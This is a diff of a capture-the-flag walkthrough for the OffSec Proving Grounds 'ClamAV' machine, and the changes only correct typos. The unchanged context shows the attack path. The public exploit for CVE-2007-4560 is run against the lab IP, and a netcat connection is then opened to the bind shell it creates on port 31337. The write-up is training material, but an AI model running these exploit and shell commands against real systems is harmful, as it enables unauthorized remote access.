@@ -5,7 +5,7 @@ platform: "Offsec"
 difficulty: "Easy"     # Easy, Medium, Hard, Insane
 os: "Linux"            # Linux, Windows
 tags: ["CTF","Offsec","Linux", "Easy"]
-skills: ["SNMP enum","CVE-2007-4560"]
+skills: ["SNMP Enum","CVE-2007-4560"]
 ---
 
 In this walkthrough, I demonstrate how I obtained complete ownership of ClamAV from OffSec Proving Grounds.
@@ -149,7 +149,7 @@ Although I was not able to enumerate **clamav-milter** version, digging deep in 
  3881                  runnable              sendmail-mta          sendmail: MTA: accepting connections
 ```
 
-After reading and understanding the exploit.First, we execute the exploit.
+After reading and understanding the exploit. First, we execute the exploit.
 
 ```bash
 perl 4761.pl 192.168.69.42
@@ -176,7 +176,7 @@ Attacking 192.168.69.42...
 221 2.0.0 localhost.localdomain closing connection
 ```
 
-Then, we should be able to connect to the machine (The exploit opens a port for us to connect - Bind Shell)
+Then, we should be able to connect to the machine (The exploit opens a port for us to connect - *Bind Shell*)
 
 ```bash
 nc -nv 192.168.69.42 31337
